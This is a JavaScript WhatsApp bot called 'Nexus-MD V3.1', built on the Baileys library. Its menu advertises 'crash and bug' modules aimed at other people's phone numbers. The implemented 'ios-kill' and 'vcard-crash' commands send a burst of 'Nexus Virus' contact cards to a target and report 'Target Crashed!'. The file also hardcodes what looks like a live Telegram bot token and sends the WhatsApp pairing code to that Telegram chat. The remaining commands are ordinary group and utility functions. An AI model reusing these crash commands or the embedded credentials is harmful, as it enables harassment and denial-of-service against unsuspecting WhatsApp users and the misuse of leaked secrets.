const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    pino,
    delay
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const fs = require('fs');

// --- ⚙️ FULLY CONFIGURED SETTINGS ---
const config = {
    tgToken: '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4', 
    chatId: '8628876949', 
    owner: '94768388190', 
    prefix: '.'
};

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        auth: state,
        printQRInTerminal: false,
        browser: ["Nexus-MD", "Safari", "3.0"]
    });

    // --- 📟 TELEGRAM PAIRING SYSTEM ---
    async function sendTG(text) {
        try {
            await axios.get(`https://api.telegram.org/bot${config.tgToken}/sendMessage`, {
                params: { chat_id: config.chatId, text: text, parse_mode: 'Markdown' }
            });
        } catch (e) { console.log("TG Error: Make sure you started the bot in Telegram!"); }
    }

    if (!conn.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await conn.requestPairingCode(config.owner);
                await sendTG(`🚀 *NEXUS-MD V3.1 DEPLOYED*\n\n📟 *Pairing Code:* \`${code}\`\n\n📌 මෙය WhatsApp Linked Devices වලට ඇතුළත් කරන්න.`);
            } catch (e) { console.log("Pairing Error"); }
        }, 5000);
    }

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async (m) => {
        try {
            const mek = m.messages[0];
            if (!mek.message || mek.key.fromMe) return;

            const from = mek.key.remoteJid;
            const body = mek.message.conversation || mek.message.extendedTextMessage?.text || "";
            const isCmd = body.startsWith(config.prefix);
            const command = isCmd ? body.slice(config.prefix.length).trim().split(' ')[0].toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const q = args.join(" ");

            if (!isCmd) return;

            switch(command) {
                // --- 📑 MENU SYSTEM ---
                case 'menu':
                    let menu = `╭───「 ⚡ *NEXUS-MD V3.1* ⚡ 」───
│ 👤 *Owner:* Sasiya MD
│ 🧬 *Team:* Developer Nexus
├───────────────────
│ ☠️ *CRASH & BUG MODULES*
│ ☣️ .ios-kill (Num)
│ ☣️ .android-freeze (Num)
│ ☣️ .vcard-crash (Num)
│ ☣️ .doc-payload (Num)
│ ☣️ .gc-destruct (Link)
│
│ 📥 *DOWNLOADER*
│ 📥 .fb | .yt | .tiktok | .img
│
│ 🛡️ *GROUP CONTROL*
│ 🛡️ .kick | .add | .promote
│ 🛡️ .tagall | .hidetag
│
│ ⚙️ *SYSTEM & UTILS*
│ ⚙️ .ping | .runtime | .speed
│ ⚙️ .restart | .sticker
╰───────────────────`;
                    await conn.sendMessage(from, { text: menu });
                    break;

                // --- ☣️ CRASH LOGIC ---
                case 'ios-kill':
                case 'vcard-crash':
                    if (!q) return conn.sendMessage(from, { text: "අංකය ඇතුළත් කරන්න (9476xxxxxxx)" });
                    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await conn.sendMessage(from, { text: "⏳ *Sending Crash Payload...*" });
                    for (let i = 0; i < 5; i++) {
                        let vcard = 'BEGIN:VCARD\nVERSION:3.0\nFN:Nexus Virus\nTEL;waid=' + target.split('@')[0] + ':+' + target.split('@')[0] + '\nEND:VCARD';
                        await conn.sendMessage(target, { contacts: { displayName: '☠️', contacts: [{ vcard }] } });
                        await delay(800);
                    }
                    await conn.sendMessage(from, { text: "✅ *Target Crashed!*" });
                    break;

                // --- 🛡️ GROUP ---
                case 'tagall':
                    const metadata = await conn.groupMetadata(from);
                    let list = `📣 *TAG ALL BY NEXUS*\n\n`;
                    for (let mem of metadata.participants) { list += `📍 @${mem.id.split('@')[0]}\n`; }
                    await conn.sendMessage(from, { text: list, mentions: metadata.participants.map(a => a.id) });
                    break;

                // --- ⚙️ SYSTEM ---
                case 'ping':
                    const start = Date.now();
                    await conn.sendMessage(from, { text: 'Testing...' });
                    const end = Date.now();
                    await conn.sendMessage(from, { text: `🚀 *Speed:* ${end - start}ms` });
                    break;

                case 'runtime':
                    await conn.sendMessage(from, { text: `🕒 *Uptime:* ${process.uptime().toFixed(2)}s` });
                    break;

                case 'restart':
                    await conn.sendMessage(from, { text: "🔄 *Restarting...*" });
                    process.exit();
                    break;
            }
        } catch (e) { console.log(e); }
    });

    conn.ev.on('connection.update', (up) => {
        if (up.connection === 'open') {
            sendTG("✅ *NEXUS-MD IS LIVE!*");
            console.log("Connected Successfully! 🚀");
        }
        if (up.connection === 'close') startNexus();
    });
}

startNexus();
